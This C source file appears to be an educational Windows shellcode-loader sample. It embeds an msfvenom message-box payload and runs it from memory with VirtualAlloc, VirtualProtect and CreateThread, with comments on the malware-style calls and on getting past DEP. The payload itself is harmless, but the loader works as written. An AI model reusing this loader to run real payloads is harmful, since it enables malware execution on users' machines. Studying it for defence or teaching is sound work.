
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// the actual payload
// using msfvenom for windows/x64/messagebox with text and title, excluding certain characters
unsigned char actual_payload[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60"
    "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
    "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
    "\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
    "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
    "\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40"
    "\x20\x50\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
    "\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
    "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
    "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
    "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
    "\x58\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
    "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
    "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
    "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x0a"
    "\x00\x00\x00\x49\x74\x20\x77\x6f\x72\x6b\x73\x21\x00\x5a"
    "\xe8\x06\x00\x00\x00\x48\x65\x6c\x6c\x6f\x00\x41\x58\x48"
    "\x31\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41"
    "\xba\xf0\xb5\xa2\x56\xff\xd5";

unsigned int actual_payload_length = sizeof(actual_payload);

int main(void)
{
    void *memory_for_payload; // buffer for storing the payload
    BOOL operation_status;
    HANDLE thread_handle;
    DWORD previous_protection_level = 0;

    // reserve and commit memory for the payload
    memory_for_payload = VirtualAlloc(0, actual_payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // transfer the payload to the allocated buffer
    RtlMoveMemory(memory_for_payload, actual_payload, actual_payload_length); // RtlMoveMemory is just an alias for memcpy provided by ntdll.dll
    // many malware uses RtlMoveMemory instead of memcpy

    // mark the new buffer as executable
    operation_status = VirtualProtect(memory_for_payload, actual_payload_length, PAGE_EXECUTE_READ, &previous_protection_level);

    // By default, Windows memory allocated with VirtualAlloc is non-executable (DEP — Data Execution Prevention).
    // If you try to run code in RW memory, Windows will block/terminate it.
    // Flipping it to PAGE_EXECUTE_READ bypasses DEP and allows execution.

    if (operation_status != 0)
    {
        // execute the payload
        thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)memory_for_payload, 0, 0, 0);

        // LPTHREAD_START_ROUTINE is a typedef alias for PTHREAD_START_ROUTINE, typically used to define a pointer to a function
        // that serves as the starting address for a new thread in multithreaded programming. This alias is commonly used in Windows API programming to improve code
        // readability and maintain consistency with naming conventions.

        WaitForSingleObject(thread_handle, -1);
    }
    return 0;
}